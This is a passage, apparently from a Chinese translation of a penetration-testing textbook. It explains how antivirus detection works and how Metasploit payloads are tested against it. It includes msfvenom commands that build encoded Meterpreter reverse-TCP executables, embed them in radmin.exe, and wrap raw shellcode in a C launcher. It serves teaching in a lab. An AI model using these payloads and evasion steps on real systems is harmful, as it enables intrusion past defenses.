  \ 哈希算法并不是完美的，被篡改过的二进制文件可能与原始文件具有相同的 MD5 哈希，这被称为 `MD5 碰撞攻击`。由于这个原因，许多厂商还会发布安全哈希算法（SHA）哈值。\n\
  \n当然，检查两个独立的哈希值比检查一个要好。`SHA` 家族包含多个哈希算法，使用的版本会随厂商而异。Kali 自带了用于各种 `SHA` 哈值的程序。例如，`sha512sum`\
  \ 计算 64 位块大小的 SHA-2 哈希，如下所示。\n\n```\nroot@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe\n\
  5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d\n\
  7ef10541b22ccecd195446c55582f735374fb8df16c94343  /usr/share/windows-binaries/radmin.exe\n\
  root@kali:~# sha512sum radmin.exe\nf9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060\n\
  d5cd15b143c146e834c491e477718bbd6fb9c2e96567e88  radmin.exe\n```\n\n在安装软件时，务必计算你下载版本的哈希值，并将其与厂商发布的值进行对比。\n\
  \n## 杀毒软件如何工作\n\n在我们尝试使用不同的技术让我们的 Metasploit Payload 绕过杀毒程序之前，让我们先讨论一下这些程序是如何工作的。大多数杀毒解决方案首先将潜在危险的代码与构成`病毒库定义`的模式和规则进行比较，这些规则匹配已知的恶意代码。随着每个厂商识别出新的恶意软件，`病毒库定义`会定期更新。这种识别方式被称为`静态分析`。\n\
  \n除了针对一组特征进行静态分析外，更高级的杀毒解决方案还会测试恶意活动，这被称为`动态分析`。例如，一个试图替换硬盘上每个文件或每隔 30 秒连接到已知僵尸网络命令与控制服务器的程序就会表现出潜在的恶意活动，并可能被标记。\n\
  \n### 注意事项\n\n某些杀毒产品（例如 Google 的 `Bouncer`）会在隔离的沙箱中运行上传到 Google Play 商店的新应用，并通过静态分析，以尝试检测没有已知恶意特征的恶意活动。\n\
  \n## 微软安全基础版 (Microsoft Security Essentials)\n\n在本节中，我们使用了不同的方法来降低检测率，请记住，即使你无法在所有杀毒厂商中都获得\
  \ 0% 的检测率，如果你知道你的客户端环境中部署了哪种杀毒解决方案，你就可以集中精力只清除那一个杀毒程序。在本章中，我们将尝试使用各种方法绕过 Microsoft\
  \ Security Essentials。\n\n当我们在第 1 章中创建 Windows 7 目标时，安装了 Microsoft Security Essentials，但没有开启实时防护来扫描下载或安装的文件。现在让我们开启此防护，看看我们是否能创建一个无法检测的木马。打开\
  \ Microsoft Security Essentials，选择 `Settings`（设置）选项卡，选择 `Real-time protection`（实时防护），并勾选复框以启用该服务，如图\
  \ 12-2 所示。点击 `Save changes`（保存更改）。\n\n![Microsoft Security Essentials 实时防护](img/httpatomoreillycomsourcenostarchimages2030406.png.jpg)图\
  \ 12-2. Microsoft Security Essentials 实时防护\n\n截至写作此时，即使是像 Microsoft Security Essentials\
  \ 这样的免费杀毒解决方案在捕捉 Metasploit Payload 方面表现良好。要进行真实测试，请在开启实时防护的情况下安装带木马的 `radmin.exe`。你应该会在屏幕右下角看到一个弹窗，如图\
  \ 12-3 所示。文件在用户运行之前就会被自动删除——这确实让计划泡了汤。\n\n![检测到恶意软件](img/httpatomoreillycomsourcenostarchimages2030408.png.jpg)图\
  \ 12-3. 检测到恶意软件\n\n## VirusTotal\n\n查看哪些杀毒解决方案会将程序标记为恶意软件的一种方法，是将相关文件上传到 VirusTotal\
  \ 网站（[`www.virustotal.com/`](https://www.virustotal.com/)）。截至写作此时，VirusTotal 使用\
  \ 51 个杀毒程序扫描上传的文件，并报告哪些程序检测出了恶意软件。VirusTotal 如图 12-4 所示。\n\n![VirusTotal](img/httpatomoreillycomsourcenostarchimages2030410.png.jpg)图\
  \ 12-4. VirusTotal\n\n要查看哪些杀毒程序能检测出我们目前编写的木马 `radmin.exe`，将文件上传到 VirusTotal 并点击\
  \ `Scan it!`。由于病毒库定义不断更新，你的结果会有所不同，但正如你在图 12-5 中所示，51 个扫描器中有 25 个检测出我们的文件是恶意文件。（页面底部显示了哪些扫描器检测到了恶意软件。）\n\
  \n![木马二进制文件的杀毒检测](img/httpatomoreillycomsourcenostarchimages2030412.png.jpg)图 12-5.\
  \ 木马二进制文件的杀毒检测\n\n### 注意事项\n\nVirusTotal 将上传的文件共享给杀毒厂商，以便他们编写特征。杀毒公司使用 VirusTotal\
  \ 特征来改进检测引擎，因此你上传的任何都可能被杀毒软件捕捉。为了避免这种风险，你可以在虚拟机上安装杀毒软件并手动测试你的木马。\n\n## 绕过杀毒程序\n\n\
  如果我们想绕过杀毒解决方案，我们需要更努力地隐藏。除了简单地将其放入可执行文件之外，让我们查看其他隐藏 Metasploit Payload 的有用方法。\n\n\
  ### 编码\n\n编码器允许你避免使用破坏漏洞的字符。（你将在第 16 章 直到第 19 章中编写自己的漏洞时学习更多这些要求的知识）。在写作此时，Metasploit\
  \ 支持 32 种编码器。编码器会破坏 Payload，并预置解码指令，以便在运行之前对其进行解码。一个常见的误解是 Metasploit 的编码器是为了帮助绕过杀毒程序设计的。某些\
  \ Metasploit 编码器创建多态代码或变异代码，这确保了每次生成的编码 Payload 看起来都不同。这一过程让杀毒厂商为 Payload 创建特征变得困难，但正如我们将看到的，这不足以绕过大多数杀毒解决方案。\n\
  \n要列出 Msfvenom 中所有可用编码器，使用 `-l encoders` 选项，如示例 12-2 所示。\n\n```\nroot@kali:~# msfvenom\
  \ -l encoders\nFramework Encoders\n==================\n\n    Name              \
  \            Rank       Description\n    ----                          ----    \
  \   -----------\n    cmd/generic_sh                good       Generic Shell Variable\
  \ Command Encoder\n    cmd/ifs                       low        Generic ${IFS} Substitution\
  \ Command Encoder\n--snip—\n  ❶x86/shikata_ga_nai             excellent  Polymorphic\
  \ XOR Additive Feedback Encoder\n--snip--\n```\n\n\n\n\n\n唯一排名优秀的编码器是 `x86/shikata_ga_nai`\
  \ ❶。`Shikata Ga Nai` 是日语，意为“无可奈”。编码器的排名基于输出的熵水平。使用 `shikata_ga_nai` 时，即使是解密器存根也是多态的。该编码器工作原理的细节超出了本书的范围，但可以说，它对有效负载进行混乱，使其无法被轻易识别。\n\
  \n使用 `-e` 标记告诉 `Msfvenom` 使用 `x86/shikata_ga_nai` 编码器，如示例 12-3 所示。此外，为了进一步混淆，我们将多次通过编码器运行我们的有效负载，使用\
  \ `-i` 标记对上一轮的输出进行编码，并指定编码轮数（在本例中为 10 次）。\n\n### 示例 12-3. 使用 Msfvenom 创建加密的可执行文件\n\
  \n```\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\
  \ LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe\n[*] x86/shikata_ga_nai\
  \ succeeded with size 317 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size\
  \ 344 (iteration=2)\n--snip--\n[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)\n\
  [*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\n```\n\n现在将生成的二进制文件上传到\
  \ VirusTotal。如图 12-6 所示，即使经过加密，测试的 35 个杀毒软件产品仍检测到了我们的有效负载。这比检测率高于我们将有效负载嵌入到预构建的可执行文件中发现的比例。换句话说，`shikata_ga_nai`\
  \ 单独并不能起作用。\n\n![加密可执行文件的 VirusTotal 结果](img/httpatomoreillycomsourcenostarchimages2030414.png.jpg)图\
  \ 12-6. 加密可执行文件的 VirusTotal 结果\n\n为了看看我们是否可以改进结果，我们可以尝试在有效负载上使用多个 Metasploit 编码器。例如，我们可以将多轮\
  \ `shikata_ga_nai` 与另一个 Metasploit 编码器 `x86/bloxor` 结合，如示例 12-4 所示。\n\n### 示例 12-4.\
  \ 使用 Msfvenom 进行多编码\n\n```\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f raw ❶ > meterpreterencoded.bin❷\n\
  [*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n--snip--\n[*] x86/shikata_ga_nai\
  \ succeeded with size 560 (iteration=10)\nroot@kali:~# msfvenom -p -❸ -f exe -a\
  \ x86❹ --platform windows❺ -e x86/bloxor -i 2 > meterpretermultiencoded.exe < meterpreterencoded.bin❻\n\
  [*] x86/bloxor succeeded with size 638 (iteration=1)\n[*] x86/bloxor succeeded with\
  \ size 712 (iteration=2)\n```\n\n这一次，我们像常一样让 `Msfvenom` 使用 `windows/meterpreter/reverse_tcp`\
  \ 有效负载，并像上一个示例一样用 `shikata_ga_nai` 对其进行编码。然而，我们没有将格式设置为 `.exe`，而是以原始格式 ❶ 输出。此外，我们没有像之前那样将结果输出到\
  \ `.exe` 文件，这次我们将原始字节输出到 `.bin` 文件 ❷。\n\n现在我们获取 `shikata_ga_nai` 编码的结果，并使用 `x86/bloxor`\
  \ 编码器对其再次编码。我们的 `Msfvenom` 语法将与习惯不同。首先，我们使用选项 `-p -` ❸ 将有效负载设置为空。由于我们没有设置有效负载，我们需要添加两个新选项来告诉\
  \ `Msfvenom` 如何编码我们的输入：`-a x86` ❹ 指定架构为 32 位，以及 `--platform windows` ❺ 指定 Windows\
  \ 平台。最后，在 `Msfvenom` 命令的末尾，我们使用 `<` 符号将上一个命令的 `.bin` 文件作为输入管道到 `Msfvenom` ❻。生成的可执行文件将通过\
  \ `shikata_ga_nai` 和 `x86/bloxor` 进行编码。\n\n截至本文编写，生成的可执行文件在 VirusTotal 上被 33 个杀毒软件检测到——比单独使用\
  \ `shikata_ga_nai` 稍微好一点。你可能通过尝试不同的编码器组合并将两个以上的编码器链联，或者通过结合技术来改进结果。例如，如果我们像这里所示既将有效负载嵌入二进制文件又用\
  \ `shikata_ga_nai` 对其进行编码，会怎样？\n\n```\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e\
  \ x86/shikata_ga_nai -i 10 -f exe > radminencoded.exe\n```\n\n这仅带来了微小的改进：有效负载被 21\
  \ 个杀毒软件检测到。不幸的是，Microsoft Security Essentials 将两个可执行文件都标记为恶意，如图 12-7。如果要绕过 Windows\
  \ 7 目标机的杀毒软件检测，我们需要在 Metasploit 编码器之外寻找方法。\n\n![Microsoft 仍然将此二进制文件标记为恶意](img/httpatomoreillycomsourcenostarchimages2030416.png.jpg)图\
  \ 12-7. Microsoft 仍然将此二进制文件标记为恶意。\n\n### 自定义交叉编译\n\n作为渗透测试的事实标准，Metasploit 受到了杀毒厂商的相当关注，他们将检测\
  \ `Msfvenom` 生成的有效负载特征视为首要任务。当 `Msfvenom` 创建可执行文件时，它使用预构建模板，杀毒厂商可以使用这些模板来构建检测特征。\n\
  \n也许我们可以通过使用原始 shellcode 自行编译可执行文件来提高绕过杀毒解决方案的能力。让我们从一个简单的 C 模板开始，如示例 12-5 所示。（我们在第\
  \ 3 章 中讨论过 C 语言编程的基础。如果这个程序对你来说没有意义，请回顾该章节。）将此代码保存为名为 `custommeterpreter.c` 的文件。\n\
  \n### 示例 12-5. 自定义可执行文件模板\n\n```\n#include <stdio.h>\nunsigned char random[]= ❶\n\
  \nunsigned char shellcode[]= ❷\n\nint main(void) ❸\n{\n        ((void (*)())shellcode)();\n\
  }\n```\n\n我们需要为变量 `random` ❶ 和 `shellcode` ❷ 填充数据，它们都是无符号字符数组。我们的希望是添加一些随机性并编译自己的\
  \ C 代码将足以欺骗杀毒软件程序。`random` 变量将为模板引入一些随机性。`shellcode` 变量将持有我们用 `Msfvenom` 创建的有效负载的原始十六进制字节。`main`\
  \ 函数 ❸ 在我们编译的 C 程序启动时运行并执行我们的 shellcode。\n\n在 `Msfvenom` 中像常一样创建你的有效负载，但这次使用 `-f`\
  \ 标记将格式设置为 `c`，如示例 12-6 所示。这将创建我们可以放入文件中的十六进制字节。\n\n### 示例 12-6. 以 C 格式创建原始有效负载\n\
  \n```\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\
  \ LPORT=2345 -f c -e x86/shikata_ga_nai -i 5\nunsigned char buf[] =\n\"\\xfc\\xe8\\\
  x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\\
  x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n--snip--\n\"\\\
  x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\\
  x85\\xf6\\x75\\xec\\xc3\";\n```\n\n最后，我们需要添加一些随机性。在 Linux 系统上寻找随机性的好地方是 `/dev/urandom`\
  \ 文件。该文件专门设计用于伪随机生成器；它利用 Linux 系统的熵产生数据。\n\n但如果我们只是从 `/dev/urandom` cat 出数据，我们将得到很多不可打印字符。为了获取字符数组的正确数据，我们将使用\
  \ Linux 工具 `tr` 将 `/dev/urandom` 数据翻译为可打印字符。使用 `tr -dc A-Z-a-z-0-9`，然后将命令管道到 `head`\
  \ 命令，以只输出 `/dev/urandom` 的前 512 个字符，如此处所示。\n\n\n\n\n\n```\nroot@kali:~# cat /dev/urandom\
  \ | tr -dc A-Z-a-z-0-9 | head -c512\ns0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL\n\
  --snip--\n```\n\n现在将来自 `/dev/urandom` 的数据粘贴到 C 文件的 `random` 变量中。完成后的文件所示所示 示例 12-7。（当然，你的随机数和编码后的有效载荷会有所不同。）务必用引号将字符串括起来，并在末尾使用分号（`;`）。\n\
  \n#### 示例 12-7. 完成的自定义 C 文件\n\n```c\n#include <stdio.h>\nunsigned char random[]=\
  \ \"s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8\n\
